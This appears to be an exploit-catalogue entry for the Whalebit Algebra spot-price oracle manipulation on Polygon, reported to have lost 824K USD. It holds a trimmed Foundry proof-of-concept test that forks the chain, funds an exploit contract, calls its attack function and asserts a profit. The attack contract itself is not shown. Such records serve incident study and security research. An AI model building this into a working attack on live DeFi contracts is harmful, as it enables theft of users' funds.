# [?] WhalebitOracleManipulation - Algebra spot-price oracle manipulation

## Summary
Severity: Unknown
Chain: Polygon
Component: WhalebitOracleManipulation
Published: 2026-03-31
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-03/WhalebitOracleManipulation_exp.sol
Type: defi-exploit-poc

## Details
Lost: 824K USD

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 84_938_871;
        vm.createSelectFork("polygon", forkBlock);
        fundingToken = CES;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(CES, "CES");
        vm.label(USDT_TOKEN, "USDT");
        vm.label(FLASH_POOL, "CES/USDT flash pool");
        vm.label(ALGEBRA_POOL, "CES/USDT Algebra pool");
        vm.label(WHALEBIT_STAKING, "Whalebit staking proxy");
        vm.label(WHALEBIT_LEVELS, "Whalebit levels");
        vm.label(WHALEBIT_PRICER, "Whalebit pricer");
    }

    function testExploit() public {
        WhalebitExploit exploit = new WhalebitExploit();

        // step 1: model the trace-start CES inventory that was already in the attack contract.
        uint256 traceStartCes = 140_956.392_485_016_353_593_75 ether;
        deal(CES, address(exploit), traceStartCes);

        uint256 beforeCes = IERC20(CES).balanceOf(address(exploit));
        logTokenBalance(CES, address(exploit), "Attack Contract Before");

        vm.prank(ATTACKER, ATTACKER);
        exploit.attack();

        uint256 afterCes = IERC20(CES).balanceOf(address(exploit));
        uint256 profit = afterCes - beforeCes;
        logTokenBalance(CES, address(exploit), "Attack Contract After");
        assertGt(profit, 9000 ether, "CES profit after flash repayment");
    }
}
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-03/WhalebitOracleManipulation_exp.sol_
